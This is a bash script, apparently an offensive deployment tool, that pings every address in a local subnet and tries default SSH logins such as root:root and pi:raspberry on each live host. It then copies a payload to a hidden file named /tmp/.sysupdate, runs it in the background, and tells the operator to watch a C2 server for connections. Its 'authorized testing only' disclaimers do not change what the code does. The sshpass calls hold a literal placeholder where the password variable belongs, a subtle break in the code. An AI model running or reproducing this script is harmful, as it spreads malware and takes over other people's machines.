#!/bin/bash
# Fixed deployment script with multiple credential attempts

echo "========================================"
echo "🚀 OMNI NETWORK DEPLOYMENT"
echo "========================================"
echo "[!] For authorized testing only"
echo ""

# Configuration
SUBNET="192.168.1.0/24"
PAYLOAD="payloads/v1.0/omni_final.py"
LOG_FILE="/tmp/omni_deploy.log"

# Common credentials to try
declare -A CREDENTIALS=(
    ["root:root"]=1
    ["admin:admin"]=1
    ["ubuntu:ubuntu"]=1
    ["pi:raspberry"]=1
    ["user:user"]=1
    ["test:test"]=1
    ["administrator:password"]=1
    ["guest:guest"]=1
)

echo "[*] Scanning network: $SUBNET"
echo "[*] Payload: $PAYLOAD"
echo ""

# Get list of live hosts
echo "[*] Discovering live hosts..."
LIVE_HOSTS=()
for i in {1..254}; do
    IP="192.168.1.$i"
    # Skip localhost
    if [ "$IP" == "192.168.1.162" ]; then
        continue
    fi
    
    # Quick ping check
    if ping -c 1 -W 1 "$IP" >/dev/null 2>&1; then
        LIVE_HOSTS+=("$IP")
        echo "[+] Live host: $IP"
    fi &
done
wait

echo ""
echo "[*] Found ${#LIVE_HOSTS[@]} live hosts"
echo "[*] Starting deployment attempts..."
echo ""

SUCCESS_COUNT=0
FAIL_COUNT=0

for IP in "${LIVE_HOSTS[@]}"; do
    echo "[*] Targeting: $IP"
    DEPLOYED=false
    
    # Try each credential set
    for CRED in "${!CREDENTIALS[@]}"; do
        USER=${CRED%:*}
        PASS=${CRED#*:}
        
        # Test SSH connection
        echo -n "  Trying $USER:$PASS... "
        
        if timeout 3 sshpass -p "SSH_PASSWORD_PLACEHOLDER" ssh -o StrictHostKeyChecking=no \
           -o ConnectTimeout=2 "$USER@$IP" "echo test" >/dev/null 2>&1; then
            
            echo "SUCCESS"
            
            # Deploy payload
            if timeout 10 sshpass -p "SSH_PASSWORD_PLACEHOLDER" scp -o StrictHostKeyChecking=no \
               "$PAYLOAD" "$USER@$IP:/tmp/.sysupdate" >/dev/null 2>&1; then
                
                # Make executable and run
                timeout 5 sshpass -p "SSH_PASSWORD_PLACEHOLDER" ssh -o StrictHostKeyChecking=no \
                "$USER@$IP" "chmod +x /tmp/.sysupdate && nohup /tmp/.sysupdate >/dev/null 2>&1 &" >/dev/null 2>&1
                
                echo "  ✅ Deployed to $IP as $USER"
                SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                DEPLOYED=true
                break
            else
                echo "  ❌ Failed to copy payload"
            fi
        else
            echo "FAILED"
        fi
    done
    
    if ! $DEPLOYED; then
        echo "  ❌ No valid credentials for $IP"
        FAIL_COUNT=$((FAIL_COUNT + 1))
    fi
    
    echo ""
done

echo "========================================"
echo "📊 DEPLOYMENT SUMMARY"
echo "========================================"
echo "✅ Successfully deployed: $SUCCESS_COUNT"
echo "❌ Failed: $FAIL_COUNT"
echo "🔍 Total scanned: ${#LIVE_HOSTS[@]}"
echo ""
echo "📋 Next steps:"
echo "   1. Monitor C2 server for connections"
echo "   2. Check /tmp/omni_deploy.log for details"
echo "   3. Run payload manually on test systems"
echo ""
echo "⚠️  Remember:"
echo "   - Only test on authorized systems"
echo "   - Educational purposes only"
echo "   - Respect privacy and laws"
echo "========================================"

